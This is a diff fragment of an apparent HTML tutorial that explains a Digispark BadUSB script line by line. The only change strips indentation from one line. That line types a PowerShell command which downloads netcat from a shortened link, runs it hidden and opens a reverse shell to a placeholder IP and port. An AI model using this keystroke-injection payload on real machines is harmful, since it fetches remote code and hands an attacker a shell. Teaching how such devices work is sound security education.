@@ -64,7 +64,7 @@
 <code>DigiKeyboard.delay(700);</code>
   <p>A delay of 700 milliseconds (0.7 seconds) is introduced.</p>
 
-<code>  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");</code>
+<code>DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");</code>
 <p>The print() function is used to simulate typing the provided string, which contains a PowerShell command.</p>
   
 <code>code></code>
